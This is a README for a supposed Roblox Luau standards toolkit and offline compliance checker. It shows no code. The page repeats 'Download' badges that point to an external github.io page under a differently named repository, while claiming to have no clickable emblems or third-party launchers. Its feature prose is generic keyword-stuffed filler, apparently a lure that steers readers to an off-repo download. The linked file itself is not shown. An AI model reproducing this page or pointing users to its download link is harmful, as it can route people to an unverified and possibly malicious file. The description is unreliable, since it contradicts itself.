![preview](https://raw.githubusercontent.com/coniieq/luau-guardrail/main/cover_8a53.svg)
[![Download](https://raw.githubusercontent.com/coniieq/luau-guardrail/main/latest_d50f.svg)](https://coniieq.github.io/luau-guardrail/)

# 🧭 Roblox Optimum — Repository Blueprint & AI Agent Field Manual

Shields below are informational only. No clickable emblems, no mirrored hosts, no third-party launchers. Just reference markers for maintainers reading raw Markdown.

![AI Ready](https://img.shields.io/badge/AI--Ready-2026-blueviolet)
![Luau](https://img.shields.io/badge/Luau-Typed-00A2FF)
![Roblox](https://img.shields.io/badge/Roblox-Studio-E2231A)
![Deterministic](https://img.shields.io/badge/Checker-Deterministic-2ECC71)
![MIT](https://img.shields.io/badge/License-MIT-yellow)

[![Download](https://raw.githubusercontent.com/coniieq/luau-guardrail/main/latest_d50f.svg)](https://coniieq.github.io/luau-guardrail/)

---

## 🌌 What This Repository Is

**Roblox Optimum** is a *specification-first* toolkit for teams who build on the Roblox platform and want their AI coding agents to behave like seasoned Luau engineers rather than enthusiastic interns who just discovered `Instance.new`.

The project has two halves that lean on each other like a pair of pillars holding up a bridge:

1. **Optimum Standards** — a human-and-machine-readable rulebook describing how professional Roblox code should look, feel, scale, and survive contact with a live experience. These standards are written to be ingested by language models as much as by humans.
2. **Optimum Checker** — a deterministic verification engine that walks your Luau source, your Rojo project layout, and your module boundaries, then reports deviations from the standard *without* ever contacting a model, an endpoint, or a cloud service. You can run it on a plane, in a locked-down CI runner, or on a toaster with a Ruby interpreter.

If your team writes Roblox code and also points a large language model at that code, this repository exists to keep the two from drifting apart.

---

## 🧠 The Philosophy Behind the Name

"Optimum" is not a claim of perfection. It is a direction. Software is a river, not a monument. The optimum is the shape a codebase finds when friction has been removed from every joint: onboarding, review, refactor, deploy, and rollback.

Roblox development in particular has three forces pulling against each other at all times:

- **Speed**, because experiences ship weekly.
- **Safety**, because a single unguarded `WaitForChild` inside a `while true do` loop turns a launch night into a war room.
- **Longevity**, because the code you write in 2026 will be refactored by someone in 2028 who has never heard of you.

Optimum is the narrow channel where all three currents flow the same way. The standards describe the channel. The checker tells you when you've drifted out of it.

---

## 🎯 Who This Is For

- **Solo developers** who want a second pair of eyes that never sleeps and never gets bored.
- **Studios** onboarding contractors who need a single, unambiguous definition of "done."
- **AI agent authors** building Roblox-capable copilots that must produce code a reviewer would actually approve.
- **Educators** teaching Luau and wanting a rubric that is executable rather than aspirational.
- **Tooling engineers** who maintain build systems, linters, or CI pipelines around Roblox projects.

If you have ever copy-pasted a module between two of your own experiences because "it just works," this repository is quietly for you.

---

## ✨ Feature List

- **Deterministic compliance engine** — the same input always yields the same report. No randomness, no network, no surprises.
- **Zero-dependency core** — the checker runs from a single script with a language runtime you almost certainly already have.
- **Responsive reporting UI** — terminal output reflows gracefully from a 60-column SSH session to a wide desktop terminal, with optional rich formatting when the terminal supports it.
- **Multilingual documentation** — the standards ship with parallel guidance in multiple human languages so distributed teams read the same rules in their native tongue.
- **AI-agent contract files** — machine-shaped instructions that describe exactly what an agent may and may not change when it edits your Roblox project.
- **Rule severity tiers** — advisory, recommended, and blocking. You decide which deviations stop a merge.
- **CI-native exit codes** — clean signals for pipelines that gate on compliance.
- **Suppression comments** — when a rule genuinely does not apply, you can silence it locally and honestly, with a reason.
- **Rule catalog with rationale** — every rule explains *why* it exists, including the war story that inspired it.
- **Extensible rule packs** — add your studio's house style without forking the whole project.
- **Performance-conscious checks** — designed to run against large repositories in seconds, not minutes.
- **No telemetry, ever** — the checker never phones home. It doesn't even know where home is.
- **Versioned standard** — each release pins a semantic version of the standard so your team can migrate deliberately.
- **24/7 customer support channel** — maintainers respond continuously across time zones, so a blocker at 03:00 does not wait for a business day.

---

## 🧩 What "Optimum Standards" Actually Contains

Think of it as a field manual with chapters. Each chapter is opinionated, concise, and paired with examples of *before* and *after*.

### Chapter 1 — Project Architecture

How a Roblox experience should be laid out on disk, how it maps into the DataModel, and how far a single module is allowed to reach. The standard treats folder structure as an API contract: if another developer cannot guess where a file lives after reading its purpose, the structure has failed.

### Chapter 2 — Luau Typing Discipline

Gradual typing is a gift, not a chore. This chapter defines when `--!strict`, `--!nonstrict`, and `--!nocheck` are appropriate, and why defaulting to strict mode in new modules is the path of least regret.

### Chapter 3 — Event and Callback Hygiene

The lifecycle of a connection, the discipline of disconnecting, and the small ceremonies that prevent memory leaks from compounding like interest on a loan you forgot you took.

### Chapter 4 — Client, Server, and Shared Boundaries

What may cross the sacred border between `ReplicatedStorage` and `ServerScriptService`, and what absolutely may not. The standard is unapologetic here because this is where security incidents are born.

### Chapter 5 — Remote Traffic Design

Argument shape, rate expectations, validation posture, and the naming conventions that make a remote immediately legible in a call stack.

### Chapter 6 — Error Semantics

When to `error`, when to `warn`, when to return a result tuple, and when to stay silent. Silence is a design decision, not a default.

### Chapter 7 — Testing and Simulation

How to structure Luau modules so they can be exercised outside Roblox, using dependency injection and thin adapters. If a module can only be tested in-engine, the standard calls that out as a design smell.

### Chapter 8 — Reviewer's Checklist

A distilled list a human reviewer can apply in ninety seconds. It is the same list the checker enforces, expressed in the language of a tired tech lead at 1 a.m.

---

## 🤖 The AI Agent Contract

An AI agent editing a Roblox codebase is a guest in someone else's kitchen. The contract file describes the guest's manners:

- **Prefer existing patterns** over introducing new ones.
- **Never widen** a public module's surface area without flagging it.
- **Preserve** suppression comments and their justifications.
- **Report** uncertainty instead of guessing at intent.
- **Avoid** touching generated files, third-party assets, or anything under a `vendor` path.
- **Log every structural change** in a machine-readable summary so a human can review the diff without reading every line.

This is not a cage. It is a handrail on a staircase. Most of the time you don't notice it; the one time you would have needed it, it holds your weight.

---

## 🛠️ The Checker at a Glance

The checker answers questions like:

- Does every module declare a typing directive consistent with the repository's configured posture?
- Are there unbound `.Changed` connections without matching disconnects in the same scope?
- Do any client scripts reach into server-only services by name?
- Are all `RemoteEvent` and `RemoteFunction` instances validated at the boundary?
- Does the Rojo project tree contain orphaned files not referenced by any module?
- Do suppressions include a reason string of sufficient length to be meaningful?

The report is written for humans first, machines second. Lines are short, columns are aligned, and the last line is always a summary — because that is the only line most of us read.

---

## 📱 Responsive Reporting UI

The reporting layer is built so that the same output remains useful across environments:

- **Narrow terminals** collapse columns vertically, keeping one fact per line.
- **Wide terminals** align columns for quick scanning.
- **Color-capable shells** use semantic accents: amber for advisories, red for blockers, green for passes.
- **Color-blind users** are supported through symbols and non-color cues — a rule never relies on hue alone.
- **Log-capture environments** produce plain text with a stable schema, suitable for grepping or feeding into a dashboard.

The UI is a courtesy, not a dependency. If you disable all formatting, the information survives intact.

---

## 🌍 Multilingual Support

Teams are scattered. English is not universal. The standard ships with translation files that keep rule *identifiers* stable across languages, so a rule suppressed in Japanese is the same rule suppressed in Portuguese.

Translation contributions are warmly welcomed. The project treats a well-translated rule as a first-class artifact, not an afterthought.

---

## 📞 24/7 Customer Support

Maintainers rotate across time zones. A question asked at any hour will typically see a first response within one waking cycle, and blocking questions are prioritized. Support is delivered through the repository's discussion channels; the specifics are listed in the contributing guide so they can be updated without editing this document.

Support is a promise about responsiveness, not a promise about scope. We are happy to help you understand a rule. We are slower to help you refactor your entire codebase.

---

## 🧪 Testing Your Own Rule Packs

Rule packs are plain data with optional callbacks. A pack can be exercised with fixture projects that live beside it in the repository. The pattern is:

- Author a fixture that *violates* the rule.
- Author a fixture that *satisfies* it.
- Assert that the checker's verdict differs between the two.

This is a boring pattern. Boring patterns are the ones that survive release cycles.

---

## 🔒 Security Posture

- The checker never executes your Luau code. It parses.
- The checker never transmits your source anywhere.
- The checker never stores credentials.
- Rule packs are sandboxed from the filesystem beyond the project root unless explicitly permitted.

If a security researcher finds a flaw, we would rather know early than late. Coordinated disclosure instructions are in a dedicated security policy file.

---

## 📚 SEO-Friendly Notes for Fellow Travelers

People often search for terms like *Roblox Luau linter*, *Roblox static analysis*, *Luau style guide*, *Roblox CI compliance*, or *Roblox AI coding standards*. This repository sits at the intersection of those concerns. If you found us through one of those phrases, you are in the right place, and the standard is written with exactly your use case in mind.

The checker is deliberately small and hackable. The standard is deliberately written in prose first. Both are deliberate responses to the same problem: knowledge that lives only in someone's head is knowledge that will one day walk out the door.

---

## 🚫 What This Project Is Not

- Not a plugin that modifies Roblox Studio.
- Not a build system that replaces Rojo.
- Not a service that runs on your behalf.
- Not a promise that code passing the checker is bug-free. The checker catches drift, not logic errors.

Clarity about what a tool is *not* is part of what makes it trustworthy about what it **is**.

---

## 🧾 License

This project is distributed under the MIT License. The full text lives in the repository and can be read here: [LICENSE](./LICENSE).

You are welcome to use, adapt, and redistribute this work under the terms described in that file. Attribution is appreciated, not enforced.

---

## ⚠️ Disclaimer

This project is an independent, community-maintained effort. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any of its subsidiaries. All trademarks belong to their respective owners.

The standards and the checker are provided **as-is**, without warranty of any kind, express or implied. Running the checker against your codebase does not guarantee that your experience will be secure, performant, or compliant with any external policy. You remain responsible for the code you ship and the consequences of shipping it.

The AI agent contract is advisory. Agents are software, and software is fallible. Always review generated diffs.

Maintainers may update rules between releases where the community identifies a better approach. Such changes are documented in the changelog so downstream teams can migrate with eyes open.

© 2026 — Roblox Optimum contributors. Released under the MIT License.

---

## 🗺️ Roadmap for 2026

- **Q1** — Expand multilingual rule descriptions and stabilize the translation format.
- **Q2** — Introduce a lightweight plugin API for third-party rule authors.
- **Q3** — Publish a migration guide for teams adopting the standard incrementally.
- **Q4** — Add an interactive walkthrough that explains each rule with runnable examples.

The roadmap is a sketch, not a contract. Priorities respond to the people actually using the tool.

---

## 🤝 Contributing

Contributions of rules, translations, fixtures, and documentation are all welcome. A good contribution includes the rule, the rationale, at least one passing and one failing fixture, and a short note explaining the change in plain language. The full workflow lives in the contributing guide so it can evolve without bloating this file.

Remember: the standard is a shared language. When you add a word to it, you change how everyone around the table speaks.

[![Download](https://raw.githubusercontent.com/coniieq/luau-guardrail/main/latest_d50f.svg)](https://coniieq.github.io/luau-guardrail/)